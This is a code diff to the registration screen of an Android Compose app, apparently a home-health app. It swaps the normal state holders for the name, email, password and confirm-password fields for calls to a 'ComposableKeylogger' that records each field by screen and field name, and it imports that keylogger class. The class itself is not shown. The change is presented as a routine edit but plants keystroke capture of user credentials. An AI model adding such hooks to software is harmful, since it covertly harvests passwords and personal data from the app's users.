@@ -15,7 +15,6 @@ import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.runtime.Composable
-import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.remember
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.setValue
@@ -28,6 +27,7 @@ import androidx.compose.ui.unit.dp
 import androidx.navigation.NavHostController
 import com.example.homehealth.viewmodels.AuthViewModel
 import androidx.compose.ui.text.input.KeyboardType
+import com.example.homehealth.keylogger.ComposableKeylogger
 
 @Composable
 fun RegisterScreen(navController: NavHostController,
@@ -35,10 +35,34 @@ fun RegisterScreen(navController: NavHostController,
 ){
     val context = LocalContext.current
 
-    var username by remember { mutableStateOf("") }
-    var email by remember { mutableStateOf("") }
-    var password by remember { mutableStateOf("") }
-    var confirm by remember { mutableStateOf("") }
+    var username by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "RegisterScreen",
+            fieldName = "username",
+            initialValue = ""
+        )
+    }
+    var email by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "RegisterScreen",
+            fieldName = "email",
+            initialValue = ""
+        )
+    }
+    var password by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "RegisterScreen",
+            fieldName = "password",
+            initialValue = ""
+        )
+    }
+    var confirm by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "RegisterScreen",
+            fieldName = "confirm_password",
+            initialValue = ""
+        )
+    }
 
     Column(
         modifier = Modifier
@@ -53,7 +77,6 @@ fun RegisterScreen(navController: NavHostController,
             modifier = Modifier.padding(bottom = 16.dp)
         )
 
-        // Pending implementation to remove emojis from all fields
         OutlinedTextField(value = username, onValueChange = { username = it },
             label = { Text("Name") }, singleLine = true
         )
